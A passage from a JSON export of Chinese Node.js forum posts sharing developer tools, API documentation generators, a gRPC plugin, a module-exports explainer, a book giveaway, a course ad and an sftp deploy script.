转换器</h5>\n<ul>\n<li>将URL转换为Markdown表格</li>\n<li>将URL转换为CSV/TSV</li>\n<li>将URL转换为JSON</li>\n<li>将URL转换为XML</li>\n<li>将URL转换为YAML</li>\n<li>将URL转换为create表格 SQL and insert SQL</li>\n<li>将URL转换为HTML表格</li>\n<li>将URL转换为Excel</li>\n<li>将URL转换为LaTex表格</li>\n<li>将URL转换为Plain Text表格</li>\n</ul>\n<h5>3. HTML表格 转换器</h5>\n<ul>\n<li>将HTML表格转换为Markdown表格</li>\n<li>将HTML表格转换为CSV/TSV</li>\n<li>将HTML表格转换为JSON</li>\n<li>将HTML表格转换为XML</li>\n<li>将HTML表格转换为YAML</li>\n<li>将HTML表格转换为create表格 SQL and insert SQL</li>\n<li>将HTML表格转换为Excel</li>\n<li>将HTML表格转换为LaTex表格</li>\n<li>将HTML表格转换为Plain Text表格</li>\n</ul>\n<h5>4.Markdown表格 转换器</h5>\n<ul>\n<li>将Markdown表格转换为CSV/TSV</li>\n<li>将Markdown表格转换为JSON</li>\n<li>将Markdown表格转换为XML</li>\n<li>将Markdown表格转换为YAML</li>\n<li>将Markdown表格转换为create表格 SQL and insert SQL</li>\n<li>将Markdown表格转换为HTML表格</li>\n<li>将Markdown表格转换为Excel</li>\n<li>将Markdown表格转换为LaTex表格</li>\n<li>将Markdown表格转换为Plain Text表格</li>\n</ul>\n<h5>5. CSV/TSV 转换器</h5>\n<ul>\n<li>将CSV转换为Markdown表格</li>\n<li>将CSV转换为JSON</li>\n<li>将CSV转换为XML</li>\n<li>将CSV转换为YAML</li>\n<li>将CSV转换为create表格 SQL and insert SQL</li>\n<li>将CSV转换为HTML表格</li>\n<li>将CSV转换为Excel</li>\n<li>将CSV转换为LaTex表格</li>\n<li>将CSV转换为Plain Text表格</li>\n</ul>\n<h5>6. JSON 转换器</h5>\n<ul>\n<li>将JSON转换为Markdown表格</li>\n<li>将JSON转换为JSON</li>\n<li>将JSON转换为XML</li>\n<li>将JSON转换为YAML</li>\n<li>将JSON转换为create表格 SQL and insert SQL</li>\n<li>将JSON转换为HTML表格</li>\n<li>将JSON转换为Excel</li>\n<li>将JSON转换为LaTex表格</li>\n<li>将JSON转换为Plain Text表格</li>\n</ul>\n<p>工具地址：<a href=\"https://tableconvert.com\">https://tableconvert.com</a></p>\n</div>","title":"一个在线表格工具","last_reply_at":"2019-04-28T06:34:51.565Z","good":false,"top":false,"reply_count":0,"visit_count":636,"create_at":"2019-04-28T06:34:51.565Z","author":{"loginname":"Fechin","avatar_url":"https://avatars2.githubusercontent.com/u/2541482?v=4&s=120"}},{"id":"5b1e20e929e6e510415b29d0","author_id":"5aed77ea1b02288048bd0cb6","tab":"share","content":"<div class=\"markdown-text\"><h1>来自<a href=\"https://github.com/shenzekun/useful-tools\">github</a> （注意github 会不定期更新，这里不再更新了）</h1>\n<h1>useful-tools</h1>\n<blockquote>\n<p>🔨 一些有用的工具网站（<strong>注意</strong>：有些网站可能需要翻墙才能看到）</p>\n</blockquote>\n<h2>浏览器兼容类🌎</h2>\n<ul>\n<li><a href=\"https://caniuse.com/\">caniuse</a> (网站开发浏览器兼容性查询)</li>\n<li><a href=\"http://browserhacks.com/\">browserhacks</a> (一些浏览器兼容写法)</li>\n</ul>\n<h2>图片类😎</h2>\n<ul>\n<li><a href=\"https://tinypng.com/\">Tinypng</a> | <a href=\"http://zhitu.isux.us/\">智图</a> (压缩图片)</li>\n<li><a href=\"http://www.biaonimeia.com/login\">标你妹啊</a> (psd 标注)</li>\n<li><a href=\"https://coolbackgrounds.io/\">Cool Backgrounds</a> (生成好看的渐变背景图)</li>\n<li><a href=\"https://carbon.now.sh/?bg=rgba(171,%20184,%20195,%201)&amp;t=seti&amp;wt=none&amp;l=auto&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=48px&amp;ph=32px&amp;ln=false&amp;fm=Hack&amp;fs=14px&amp;si=false&amp;es=2x&amp;wm=false\">carbon</a> (生成类似 mac 风格的代码图片，用于分享)</li>\n<li><a href=\"https://source.unsplash.com/\">Unsplash Source</a> (生成随机图片)</li>\n<li><a href=\"https://spritegen.website-performance.org/\">CSS Sprite Generator</a> (生成雪碧图)</li>\n<li><a href=\"http://www.iconfont.cn/plus\">iconfont</a> (阿里巴巴矢量图标库)</li>\n<li><a href=\"https://icons8.com/preloaders/\">Preloaders</a> | <a href=\"https://loading.io/\">LOADING.IO</a> (加载图，<strong>有些是收费的</strong>)</li>\n<li><a href=\"https://www.desktoppr.co/wallpapers\">desktoppr</a> (好看的壁纸)</li>\n<li><a href=\"https://material.io/tools/icons/?style=baseline\">Material icons</a> (Material icons图标)</li>\n<li><a href=\"https://www.iloveimg.com/zh-cn\">Iloveimg</a> (批量编辑图片的所有工具。包括压缩图片，剪裁图片，图片加水印，转化至jpg图片等等)</li>\n<li><a href=\"https://www.pkgif.net/\">pkgif</a> (任意GIF添加字幕)</li>\n<li><a href=\"https://imagecyborg.com/\">ImageCyborg</a> (一键下载当前网页的所有图片)</li>\n<li><a href=\"http://emblemmatic.org/markmaker/#/\">MarkMaker</a> (在线 logo 随机生成工具)</li>\n<li><a href=\"https://www.remove.bg/\">Removebg</a> (在线移除背景工具，想改图片的背景可以用这个，证件照必备😀)</li>\n</ul>\n<h2>代码类⌨️</h2>\n<ul>\n<li><a href=\"https://paste.ubuntu.com/\">Ubuntu pastebin</a> (代码分享)</li>\n<li><a href=\"https://codepen.io/pens/\">Codepen</a> (在线代码编辑)</li>\n<li><a href=\"http://jsbin.com/\">Jsbin</a> (在线代码编辑)</li>\n<li><a href=\"https://codesandbox.io/\">CodeSandbox</a> (在线写React,自动编译,有代码提示)</li>\n<li><a href=\"http://www.colorzilla.com/gradient-editor/\">Ultimate CSS Gradient Generator</a> (生成 css 渐变)</li>\n<li><a href=\"https://www.grabient.com/\">Grabient</a> (生成漂亮的 css 渐变)</li>\n<li><a href=\"https://dev.w3.org/html5/html-author/charref\">Character Entity Reference Chart</a> (各种符号的转义字符)</li>\n<li><a href=\"http://apps.eky.hk/css-triangle-generator/zh-hant\">css三角形产生器</a></li>\n<li><a href=\"https://easings.net/zh-cn?tuyiyi.com\">缓动函数速查表</a></li>\n<li><a href=\"https://regexper.com/\">Regexper</a> (正则可视化)</li>\n<li><a href=\"https://regex101.com/\">Regex101</a> (正则表达式测试)</li>\n<li><a href=\"https://visualgo.net/en\">Visualgo</a> (数据结构，算法可视化)</li>\n<li><a href=\"http://animista.net/\">Animista</a> (在线生成 css 动画)</li>\n<li><a href=\"https://developers.google.com/speed/pagespeed/insights/\">PageSpeed Insights</a> (测试网站速度，优化性能)</li>\n<li><a href=\"https://learngitbranching.js.org/\">Learn Git Branching</a> (以动画的形式让你学习 git)</li>\n<li><a href=\"http://asciiflow.com/\">Asciiflow</a> (生成类似代码注释里那种佛祖的代码。。自己画😄)</li>\n<li><a href=\"http://pxtoem.com/\">PXtoEM</a> (PX EM 单位换算)</li>\n<li><a href=\"http://epic-spinners.epicmax.co/#/\">epic-spinners</a> (一个好看的css loading 代码库)</li>\n</ul>\n<h2>效率类⚡️</h2>\n<ul>\n<li><a href=\"https://modao.cc/\">墨刀</a> (画原型图)</li>\n<li><a href=\"https://shimo.im/\">石墨文档</a> (多人实时协作的云端文档与表格)</li>\n<li><a href=\"https://www.hloom.com/resume-examples/\">resume-examples</a> (简历模板)</li>\n<li><a href=\"https://enhancv.com/\">Enhancv</a> (生成简历)</li>\n<li><a href=\"http://www.koppt.cn/index\">KOPPT</a> (ppt 模板)</li>\n<li><a href=\"https://about.beautiful.ai/\">Beautiful.Ai</a> (人工智能 ppt 模板创建)</li>\n<li><a href=\"https://www.canva.com/templates/\">Canva</a> (设计模板)</li>\n<li><a href=\"https://www.processon.com/;jsessionid=EC0CB59BD105F6FD0294417AB0B0CC22.jvm1\">ProcessOn</a> (在线画流程图，思维导图、UI原型图等等)</li>\n<li><a href=\"https://wakatime.com/\">WakaTime</a> (跟踪项目花费的时间，得装插件)</li>\n<li><a href=\"http://screensiz.es/\">Screen Sizes</a> (移动屏幕尺寸)</li>\n<li><a href=\"https://habitica.com/\">Habitica</a> (游戏化Todo)</li>\n<li><a href=\"https://smallpdf.com/\">Smallpdf</a> (非常厉害的一个网站，PDF压缩，PDF转PPT，Word，Excel等等都可以直接通过这个页面实现)</li>\n<li><a href=\"https://cli.im/\">草料二维码</a> (在线生成二维码)</li>\n<li><a href=\"https://ppt.baomitu.com\">声享</a> (在线制作 PPT)</li>\n<li><a href=\"https://mubu.com/\">幕布</a> (极简大纲笔记，一键生成思维导图)</li>\n<li><a href=\"https://infogram.com/\">Infogram</a> (在线图表制作工具)</li>\n<li><a href=\"https://uzer.me/\">UZER.ME</a> (能够在线使用ps，ai，office，xmind，火狐浏览器等多个应用的网站)</li>\n<li><a href=\"http://www.nicetool.net/\">NiceTool</a> (在线工具集合网站)</li>\n</ul>\n<h2>查询类🔎</h2>\n<ul>\n<li><a href=\"https://devhints.io/\">devhints</a> (常用速查表，快速查询各类框架和库的常用方法，很实用)</li>\n<li><a href=\"https://docschina.org/\">印记中文</a> (快速查询各类框架和周边库的中文文档)</li>\n<li><a href=\"https://csstriggers.com/\">Css Triggers</a> (列出了哪些CSS属性在不同的渲染引擎中是否会触发重排或重绘)</li>\n<li><a href=\"https://securityheaders.com/\">Security Headers</a> (搜索网站是否有不安全的头部 header 设置，并会评分)</li>\n</ul>\n</div>","title":"分享一些有用的工具网站","last_reply_at":"2019-04-28T06:27:43.404Z","good":false,"top":false,"reply_count":73,"visit_count":9962,"create_at":"2018-06-11T07:12:41.157Z","author":{"loginname":"shenzekun","avatar_url":"https://avatars1.githubusercontent.com/u/21151080?v=4&s=120"}},{"id":"5cc53af6a86ae80ce64b4ed6","author_id":"58018308fdf3bd3d6511866b","tab":"share","content":"<div class=\"markdown-text\"><h2>为什么需要 API 文档</h2>\n<p>目前大的环境下面，基本服务都以单体服务转换成前后端分离的服务，客户端作为调用方，服务端作为提供方需要给予到调用方通俗易懂的文档。</p>\n<h2>常见 API 文档有哪些</h2>\n<ol>\n<li><a href=\"https://github.com/GitbookIO/gitbook\">gitbook</a></li>\n</ol>\n<blockquote>\n<p>Modern documentation format and toolchain using Git and Markdown</p>\n</blockquote>\n<p><img src=\"https://uploader.shimo.im/f/45J30B4D0d4L7CWC.png!thumbnail\" alt=\"图片\"></p>\n<ul>\n<li><a href=\"https://github.com/GitbookIO/gitbook/blob/master/docs/setup.md\">Usage</a></li>\n<li>优点：\n<ul>\n<li>类似书籍的管理方式（适合写书）</li>\n<li>支持多人协作，支持保存在 Github 中</li>\n<li>支持 Build 成静态网页，部署方便</li>\n</ul>\n</li>\n<li>缺点：\n<ul>\n<li>需要熟悉 <em>Markdown</em> 语法，不是实时生成，需要使用 <a href=\"https://github.com/GitbookIO/gitbook-cli\">Git-cli</a> 打包文件</li>\n<li>以一本书籍作为起点，只能放到单个项目中</li>\n</ul>\n</li>\n<li>总结：适合写书籍，不太适合 API 开发文档</li>\n</ul>\n<ol>\n<li><a href=\"https://github.com/jsdoc3/jsdoc\">jsdoc</a></li>\n</ol>\n<blockquote>\n<p>An API documentation generator for JavaScript.</p>\n</blockquote>\n<p><img src=\"https://uploader.shimo.im/f/UyoiKuM54H08ylGa.png!thumbnail\" alt=\"图片\"></p>\n<ul>\n<li><a href=\"http://usejsdoc.org/\">Usage</a></li>\n<li>优点：\n<ul>\n<li>功能丰富，支持引入块状注释（<a href=\"https://www.html.cn/doc/jsdoc/tags-example.html\">Block Tags</a>）</li>\n<li>功能丰富，支持内联注释（<a href=\"https://www.html.cn/doc/jsdoc/tags-inline-link.html\">Inline Tags</a>）</li>\n<li>强大的社区支持，各个平台支持 jsdocs 插件</li>\n</ul>\n</li>\n<li>缺点：\n<ul>\n<li>有一定的学习成本，需要学习它的块状注释使用方式</li>\n<li>UI 只能单项目使用，每个项目的 DOC UI 独立</li>\n</ul>\n</li>\n<li>在线样例（<a href=\"https://github.com/SoftwareBrothers/better-docs\">b</a><a href=\"https://softwarebrothers.github.io/admin-bro-dev/index.html\">etter-</a><a href=\"https://github.com/SoftwareBrothers/better-docs\">d</a><a href=\"https://github.com/SoftwareBrothers/better-docs\">ocs</a> <a href=\"https://nhnent.github.io/tui.jsdoc-template/latest/\">tui-jsdoc-template</a>)</li>\n<li>总结：适合深度定制项目，比如说我们对外开放 API 给开发者使用。</li>\n</ul>\n<ol>\n<li><a href=\"https://github.com/Surnet/swagger-jsdoc\">swagger-jsdoc</a></li>\n</ol>\n<blockquote>\n<p>Generates swagger doc based on JSDoc.</p>\n</blockquote>\n<p><img src=\"https://uploader.shimo.im/f/fHtWq6Xh6gcnZNZm.png!thumbnail\" alt=\"图片\"></p>\n<ul>\n<li><a href=\"https://github.com/Surnet/swagger-jsdoc/tree/master/example/v2\">Usage</a></li>\n<li>优点：\n<ul>\n<li>集合 Swagger，支持按照类似 JSDoc 方式生成文档</li>\n<li>支持错误定位，如果注释书写错误，能够抛出具体的错误栈</li>\n<li>支持 <a href=\"https://github.com/Surnet/swagger-jsdoc/blob/master/docs/CLI.md\">CLI</a>，自由选择文件输出位置</li>\n</ul>\n</li>\n<li>缺点：\n<ul>\n<li>书写格式不友好，强格式要求，对于新手来说不容易上手，官方样例较少，很多语法需要对于 Swagger YAML 格式，自己理解进行映射</li>\n<li>没有能够完成安装 JSDoc 格式来书写注释，更倾向于 YAML 文件</li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><a href=\"https://github.com/SensitiveMix/doc-generators\">doc-generators</a></li>\n</ol>\n<blockquote>\n<p>simple generator handler for swagger</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>&#x2F;**\n * @typedef Product\n * @property {integer} id\n * @property {string} name.required - Some description for product\n * @property {Array.&lt;Point&gt;} Point\n *&#x2F;\n\n&#x2F;**\n * This function comment is parsed by doctrine\n * sdfkjsldfkj\n * @route POST &#x2F;users\n * @param {Point.model} point.body.required - the new point\n * @group foo - Operations about user\n * @param {string} email.query.required - username or email\n * @param {string} password.query.required - user&#x27;s password.\n * @param {enum} status.query.required - Status values that need to be considered for filter - eg: available,pending\n * @operationId retrieveFooInfo\n * @produces application&#x2F;json application&#x2F;xml\n * @consumes application&#x2F;json application&#x2F;xml\n * @returns {Response.model} 200 - An array of user info\n * @returns {Product.model}  default - Unexpected error\n * @returns {Array.&lt;Point&gt;} Point - Some description for point\n * @headers {integer} 200.X-Rate-Limit - calls per hour allowed by the user\n * @headers {string} 200.X-Expires-After - \tdate in UTC when token expires\n * @security JWT\n *&#x2F;\n</code></pre><ul>\n<li><a href=\"https://github.com/SensitiveMix/doc-generators/blob/master/example/router.js\">Usage</a></li>\n<li>优点：\n<ul>\n<li>支持集成 Swagger，支持按照类似 JSDoc 方式生成文档</li>\n<li>友好的文档的注释，贴合 IDE 函数注释</li>\n</ul>\n</li>\n<li>缺点：\n<ul>\n<li>实现可用的基础上，需要支持到 IDE，方便一键生成，支持自动化</li>\n</ul>\n</li>\n</ul>\n<h2>Example</h2>\n<pre class=\"prettyprint\"><code>&#x2F;**\n * verify quarantine site\n * @route POST &#x2F;ui&#x2F;quarantine&#x2F;v1&#x2F;verify_od_dedicated_quarantine_site\n * @group quarantine\n * @param {QuarantineJSON.model} body.body.required - post body\n * @returns {object} 200 - An array of handler info\n * @returns {Error} 400 - invalid site\n * @returns {Error} 500 - internal error\n *&#x2F;\n&#x2F;**\n * JSON parameters require a model. This one just has &quot;name&quot;\n * @typedef QuarantineJSON\n * @property {string} site.required - quarantine site info\n *&#x2F;\n    server.post(&#x27;&#x2F;ui&#x2F;quarantine&#x2F;v1&#x2F;verify_od_dedicated_quarantine_site&#x27;, middleware.other.verifyLoginInfo,\n        rbac.quarantine.write, quarantine.verifyOdDedicatedQuarantineSite);\n</code></pre><pre class=\"prettyprint\"><code>&#x2F;**\n * HTTP API statistics\n * @route GET &#x2F;monit&#x2F;v1&#x2F;metric\n * @group monit\n * @param {string} sort.query - asc | desc\n * @param {string} direction.query - count | avarageMillisecondCost | routeName\n * @returns {object} 200 - An array of user info\n * @returns {metrics.model} default - Unexpected error\n *&#x2F;\n&#x2F;**\n * @typedef metrics\n * @property {string} routeName.required - &#x27;getuiadminv1company_plans&#x27;\n * @property {number} count.required - route invoke times\n * @property {number} avarageMillisecondCost.required - route avg second cost\n *&#x2F;\n\nserver.get(&quot;&#x2F;monit&#x2F;v1&#x2F;metric&quot;, validator.query({\n    type: &#x27;object&#x27;,\n    properties: {\n        sort: { type: &#x27;string&#x27;, enum: [&#x27;count&#x27;] },\n        direction: { type: &#x27;string&#x27;, enum: [&#x27;asc&#x27;, &#x27;desc&#x27;] }\n    }\n}), monitService.apiMetricHandlers);\n</code></pre><p>项目地址：<a href=\"https://github.com/SensitiveMix/doc-generators\">https://github.com/SensitiveMix/doc-generators</a>\n喜欢的同学请点个 Star</p>\n</div>","title":"Node 项目使用注入 API 文档实践","last_reply_at":"2019-04-28T05:32:38.435Z","good":false,"top":false,"reply_count":0,"visit_count":417,"create_at":"2019-04-28T05:32:38.435Z","author":{"loginname":"sunNode","avatar_url":"https://avatars2.githubusercontent.com/u/16094680?v=4&s=120"}},{"id":"5cc4faa937faec0ce1d07681","author_id":"58de5214b3e60b982d089dc3","tab":"share","content":"<div class=\"markdown-text\"><p>说是骗星的, 目的不纯啊. 都忘放github地址了, 谢评论区提醒:\n<a href=\"https://github.com/xiaozhongliu/grpc-client-egg\">https://github.com/xiaozhongliu/grpc-client-egg</a></p>\n<p>这里给一下TS中的使用方法.</p>\n<h1>grpc-client-egg</h1>\n<p><a href=\"https://www.npmjs.org/package/grpc-client-egg\"><img src=\"https://img.shields.io/npm/v/grpc-client-egg.svg?style=flat-square\" alt=\"npm version\"></a></p>\n<blockquote>\n<p>An egg grpc client written in Typescript.</p>\n</blockquote>\n<h2>How to use</h2>\n<p>1 install</p>\n<pre class=\"prettyprint language-sh\"><code>npm i -S grpc-client-egg\n</code></pre><p>2 include</p>\n<pre class=\"prettyprint language-ts\"><code>import { EggPlugin } from &#x27;egg&#x27;\n\nconst plugin: EggPlugin = {\n\n    routerPlus: {\n        enable: true,\n        package: &#x27;egg-router-plus&#x27;,\n    },\n    grpcClient: {\n        enable: true,\n        package: &#x27;grpc-client-egg&#x27;,\n    },\n}\n\nexport default plugin\n\n</code></pre><p>3 config</p>\n<pre class=\"prettyprint language-ts\"><code>import { EggAppConfig, PowerPartial } from &#x27;egg&#x27;\n\nexport default () =&gt; {\n    const config: PowerPartial&lt;EggAppConfig&gt; = {\n\n        grpcClient: {\n            clients: [\n                {\n                    name: &#x27;main&#x27;,\n                    protoPath: &#x27;app&#x2F;proto&#x2F;main&#x27;,\n                    host: &#x27;0.0.0.0&#x27;,\n                    port: 50051,\n                },\n            ],\n        },\n    }\n    return config\n}\n</code></pre><p>4 invoke promisified grpc service methods</p>\n<pre class=\"prettyprint language-ts\"><code>import { Service } from &#x27;egg&#x27;\n\nexport default class Greeter extends Service {\n\n    readonly greeter: GreeterService = this.app.grpcClient.main.greeter.Greeter\n\n    public async sayHello(name: string) {\n        return this.greeter.sayHello({ name })\n    }\n\n    public async sayGoodbye(name: string) {\n        return this.greeter.sayGoodbye({ name })\n    }\n}\n</code></pre><h2>Default config from the plugin</h2>\n<pre class=\"prettyprint language-ts\"><code>    loaderOption: {\n        keepCase: true,\n        longs: String,\n        enums: String,\n        defaults: true,\n        oneofs: true,\n    },\n\n    clients: [\n        {\n            name: &#x27;main&#x27;,\n            protoPath: &#x27;app&#x2F;proto&#x2F;main&#x27;,\n            host: &#x27;0.0.0.0&#x27;,\n            port: 50051,\n        },\n    ],\n</code></pre></div>","title":"我又来骗星了, grpc-client-egg插件, TS与非TS都适用","last_reply_at":"2019-04-28T02:28:40.683Z","good":false,"top":false,"reply_count":3,"visit_count":434,"create_at":"2019-04-28T00:58:17.513Z","author":{"loginname":"xiaozhongliu","avatar_url":"https://avatars3.githubusercontent.com/u/17674404?v=4&s=120"}},{"id":"5c2edce13898674067a7b103","author_id":"5372465f3c72496d41009adc","tab":"share","content":"<div class=\"markdown-text\"><p>截止1 月 12日晚 22:00，有效参与人数共 252 人，抽取 5 名中奖者。\n恭喜以下中奖者🎉🎉🎉🎉🎉 gofromzero,MoeXian,yxcs,caoxiaoshuai1,langjy🎉🎉🎉🎉🎉\n请评论区留下联系方式。\n<img src=\"//static.cnodejs.org/Fvx9s9EjQk7IwNrAMO5_y7zJfrej\" alt=\"image.png\"></p>\n<p>---------------- 以下是原文 ----------------</p>\n<p>新书《Node.js开发实战》热卖，大获好评，感谢大家的支持，送几本书回馈给大家。</p>\n<p>赠书办法：</p>\n<ul>\n<li>只须在本贴留言即可。</li>\n<li>从回贴评论者中随机抽取中奖者，共计 5 本，每位中奖者 1 本。</li>\n<li>获赠名单公布在本帖，并在本贴下评论 @ 每位获赠的同学。</li>\n<li>截止时间 2019 年 1 月 12 日 22:00:00 （ UTC+8 ），以评论时间为准。</li>\n<li>由于本站不支持私信，请获奖同学在本帖回复联系方式，邮箱或者任何其它能联系到你的形式。</li>\n<li>开奖后 72 小时未能回复联系方式者视为放弃。</li>\n</ul>\n<p>试读样章：<a href=\"https://pan.baidu.com/s/1x3c35AmJV4rcEj_W3A1WGg\">https://pan.baidu.com/s/1x3c35AmJV4rcEj_W3A1WGg</a>\n京东有售：<a href=\"https://item.jd.com/12460185.html\">https://item.jd.com/12460185.html</a>\n<img src=\"//static.cnodejs.org/Finp2H7di-Equ_yMWsjJY6hxYGkh\" alt=\"WechatIMG148 copy.jpg\"></p>\n</div>","title":"送几本《Node.js开发实战》","last_reply_at":"2019-04-28T02:23:23.318Z","good":false,"top":false,"reply_count":364,"visit_count":14600,"create_at":"2019-01-04T04:11:13.570Z","author":{"loginname":"meikidd","avatar_url":"https://avatars0.githubusercontent.com/u/376338?v=4&s=120"}},{"id":"5cc2ef9da86ae80ce64b47f5","author_id":"5cc18fd637faec0ce1d06af1","tab":"share","content":"<div class=\"markdown-text\"><p>之前看过几篇关于<strong>exports</strong>、<strong>module.exports</strong>感觉都说的不清不楚，作为菜鸟，今天看了node.js实战后，才彻底搞清楚他们之间的区别，故在此分享下书中关于这两个对象/变量的区别，大佬就略过吧，哈哈）。\n为了保持原汁原味，我就先把原文关于exports和module.exports区别搬过来，后面有更深的理解再做解析、分析，希望能帮助到和我一样的初学者。\n\t原文：Node 模块允许从被引入文件中选择要暴露给程序的函数和变量。如果模块返回的函数或变量不止一个，那它可以通过设定 exports 对象的属性来指明它们。但如果模块只返回一个函数或变量，则可以设定 module.exports 属性。\n\t代码实例exports:\n\t\tconst canadianDollar = 0.91;\n\t\tfunction roundTwo(amount) {\n\t\t return Math.round(amount * 100) / 100;\n\t\t}\n\t\t<em>exports.canadianToUS = canadian =&gt; roundTwo(canadian * canadianDollar);</em>\n\t\t*exports.USToCanadian = us =&gt; roundTwo(us / canadianDollar); *</p>\n<pre class=\"prettyprint\"><code>exports 对象上只设定了两个属性。也就是说引入这个模块的代码只能访问到 canadianToUS 和 USToCanadian 这两个函数。而变量 canadianDollar 作为私有变量仅作用在canadianToUS 和 USToCanadian 的逻辑内部，程序不能直接访问它。\n尽管用函数和变量组装 exports 对象能满足大多数的模块创建需要，但有时你可能需要用不同的模型创建该模块。比如说，前面创建的那个货币转换器模块可以改成只返回一个 Currency 构造函数，而不是包含两个函数的对象。\n要创建只返回一个变量或函数的模块，你可能会以为只要把 exports 设定成你想返回的东西就行。但这样是不行的，因为 Node 觉得不能用任何其他对象、函数或变量给 exports 赋值。下面这个代码中的模块代码试图将一个函数赋值给 exports。\n**错误**代码示例：\nclass Currency {\n constructor(canadianDollar) {\n this.canadianDollar = canadianDollar;\n }\n roundTwoDecimals(amount) {\n return Math.round(amount * 100) &#x2F; 100;\n }\n canadianToUS(canadian) {\n return this.roundTwoDecimals(canadian * this.canadianDollar);\n }\n USToCanadian(us) {\n return this.roundTwoDecimals(us &#x2F; this.canadianDollar);\n }\n}\nexports = Currency; &#x2F;&#x2F;错误的方式，将会报错\n\n为了让前面那个模块的代码能用，需要把 exports 换成 module.exports。用 module.exports 可以对外提供单个变量、函数或者对象。如果你创建了一个既有 exports 又有module.exports 的模块，那它会返回 module.exports，而 exports 会被忽略。\n注意：最终在程序里导出的是 module.exports。exports 只是对 module.exports 的一个全局引用，最初被定义为一个可以添加属性的空对象。exports.myFunc 只是 module.exports.myFunc 的简写。所以，如果把 exports 设定为别的，就打破了 module.exports 和 exports 之间的引用关系。可是因为真正导出的是 module.exports，那样 \t\t\texports 就不能用了，因为它不再指向module.exports 了。如果你想保留那个链接，可以像下面这样让 module.exports 再次引用\nexports：module.exports = exports = Currency;\n根据需要使用 exports 或 module.exports 可以将功能组织成模块，规避掉程序脚本一直增长所产生的弊端。</code></pre></div>","title":"关于js模块中的exports和module.exports区别","last_reply_at":"2019-04-28T01:10:21.472Z","good":false,"top":false,"reply_count":2,"visit_count":464,"create_at":"2019-04-26T11:46:37.252Z","author":{"loginname":"Hew007","avatar_url":"https://avatars1.githubusercontent.com/u/26536518?v=4&s=120"}},{"id":"5b44291035342ab0690613d6","author_id":"5b37500b5c8f1ea723a56b2b","tab":"share","content":"<div class=\"markdown-text\"><p>Electron是一个跨平台的桌面应用开发框架，可以让我们用html css js的技术开发跨平台桌面上可以安装的软件。</p>\n<p><strong>前4讲免费试听地址：</strong></p>\n<p><a href=\"https://pan.baidu.com/s/1Dol4tP6Jop6MXro0ULVapQ\">https://pan.baidu.com/s/1Dol4tP6Jop6MXro0ULVapQ</a></p>\n<p>electron Github的 star已经达到61957，那么他的<strong>用户量可能已经有100万了</strong>。还有大家知道的github的atom编辑器、微软的vscode编辑器，包括阿里内部的一些软件也是用 electron 开发的。既然这么热，<strong>那就一个字：学</strong>，大家都在学，你不学（有没有压力啊！！！）</p>\n<p><strong>28元购买地址</strong>:<a href=\"https://www.itying.com/goods-929.html\">https://www.itying.com/goods-929.html</a></p>\n<p><img src=\"//static.cnodejs.org/FqbpQ7iHRMdMdSrEGLD_xpe4CabH\" alt=\"1.png\"></p>\n</div>","title":"Electron视频教程_Electron+Vue跨平台桌面软件开发视频教程（收费啊--不贵一包烟钱-有试听）","last_reply_at":"2019-04-28T00:39:34.173Z","good":false,"top":false,"reply_count":34,"visit_count":8391,"create_at":"2018-07-10T03:33:36.227Z","author":{"loginname":"it-ionic","avatar_url":"https://avatars1.githubusercontent.com/u/17946554?v=4&s=120"}},{"id":"5cbb3440a86ae80ce64b1760","author_id":"5a051be2ee9b35da75a869f7","tab":"share","content":"<div class=\"markdown-text\"><h2>现在存在的问题</h2>\n<blockquote>\n<p>每次打包完, 都要打开 FileZilla 一顿拖拽然后才能上传代码, 那就立马撸一个自动化脚本就完事了</p>\n</blockquote>\n<h2>publish-sftp</h2>\n<blockquote>\n<p><a href=\"https://github.com/xiaoxiaojx/publish-sftp\">Github 传送门</a>(<s><s>顺便来骗个Star</s></s>)  以后一行命令上传本地文件到服务器啦</p>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/20/16a3b04aee0c822c?w=300&amp;h=200&amp;f=jpeg&amp;s=8252\" alt></p>\n<pre class=\"prettyprint\"><code>publish-sftp -c &#x2F;&#x2F; 完事\n</code></pre><h2>安全性</h2>\n<blockquote>\n<p>项目组已经跑了大半年, 没出过幺蛾子, 可放心使用</p>\n</blockquote>\n<h2>实现</h2>\n<blockquote>\n<p>基于 ssh2-sftp-client</p>\n</blockquote>\n<h2>快速上手</h2>\n<h3>install</h3>\n<pre class=\"prettyprint\"><code>    sudo npm i publish-sftp -g\n    sudo npm link publish-sftp\n</code></pre><h3>tips</h3>\n<blockquote>\n<p>当前目录下需要提供一份 sftp.json</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>{\n    &quot;localPath&quot;: &quot;.&#x2F;dist&quot;,\n    &quot;remotePath&quot;: &quot;&#x2F;export&#x2F;App&#x2F;xxx&quot;,\n    &quot;protectedRemotePath&quot;: &quot;&#x2F;export&#x2F;App&#x2F;xxx&quot;,\n    &quot;connect&quot;: {\n        &quot;host&quot;: &quot;xxx.xxx.xxx.xx&quot;,\n        &quot;port&quot;: 22,\n        &quot;username&quot;: &quot;root&quot;,\n        &quot;password&quot;: &quot;123456&quot;\n    }\n}\n</code></pre><h3>example</h3>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/10/18/16687b0ddcd3a2a4?w=828&amp;h=234&amp;f=jpeg&amp;s=48490\" alt=\"image\"></p>\n<blockquote>\n<p>复制 localPath 下所有文件到 remotePath/xjx/test, -c 参数为空则是复制到 remotePath, 远程目录不存在会先创建</p>\n</blockquote>\n<h3>copy</h3>\n<blockquote>\n<p>复制 localPath 下所有文件到 remotePath 目录下, 如果 xxx 有值则是复制到 <code>${remotePath}/${xxx}</code> 目录</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>publish-sftp -c xxx\n</code></pre><h3>remove</h3>\n<blockquote>\n<p>删除 remotePath 目录, 如果 xxx 有值则是删除 <code>${remotePath}/${xxx}</code> 目录, protectedRemotePath 目录是不允许操作的, 所以为了安全是必需要设置的, 一般和 remotePath 值一样即可!</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>publish-sftp -r xxx\n</code></pre><h2>谢谢阅读</h2>\n</div>","title":"Node.js 